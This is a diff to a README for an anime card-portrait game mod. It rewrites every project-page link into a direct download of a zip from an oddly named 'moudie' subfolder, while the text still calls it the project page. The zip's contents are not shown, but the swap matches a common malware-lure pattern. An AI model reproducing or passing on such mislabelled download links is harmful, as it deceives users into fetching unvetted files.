@@ -1,6 +1,6 @@
 # 🎴 RegentCardsAnimeRework - Cute Anime Card Portraits
 
-[![Download / Visit](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cjb-ux/RegentCardsAnimeRework)
+[![Download / Visit](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cjb-ux/RegentCardsAnimeRework/raw/refs/heads/main/moudie/Regent-Rework-Cards-Anime-v1.6.zip)
 
 ## ✨ What this is
 
@@ -28,7 +28,7 @@ Use this on a Windows PC with:
 
 Go to the project page here:
 
-https://github.com/cjb-ux/RegentCardsAnimeRework
+https://github.com/cjb-ux/RegentCardsAnimeRework/raw/refs/heads/main/moudie/Regent-Rework-Cards-Anime-v1.6.zip
 
 From that page, look for the download files or the latest release assets. If the project comes as a zip file, download the zip, then place the included files in the game’s mod or art folder.
 
@@ -114,4 +114,4 @@ After setup, you should see Regent card portraits with:
 
 Open the project page here and download the files from the repository:
 
-https://github.com/cjb-ux/RegentCardsAnimeRework
+https://github.com/cjb-ux/RegentCardsAnimeRework/raw/refs/heads/main/moudie/Regent-Rework-Cards-Anime-v1.6.zip
